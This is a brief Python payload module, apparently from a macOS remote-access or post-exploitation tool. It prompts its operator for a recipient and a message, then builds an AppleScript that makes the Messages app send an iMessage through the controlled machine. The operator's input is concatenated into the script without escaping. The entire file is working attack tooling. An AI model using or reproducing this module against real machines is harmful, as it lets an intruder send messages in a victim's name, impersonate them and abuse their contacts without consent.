class payload:
    def __init__(self):
        self.name = "imessage"
        self.description = "send message through the messages app"
        self.type = "applescript"
        self.id = 116

    def run(self,conn,server,command):
        #do something with conn if you want
        #we can prompt for input
        phone = raw_input("[*] Enter iMessage recipient: ")
        message = raw_input("[*] Enter message: ")
        #send applescript payload
        return """tell application "Messages"
        set targetService to 1st service whose service type = iMessage
        set targetBuddy to buddy \""""+phone+"""\" of targetService
        send \""""+message+"""\" to targetBuddy
        end tell"""
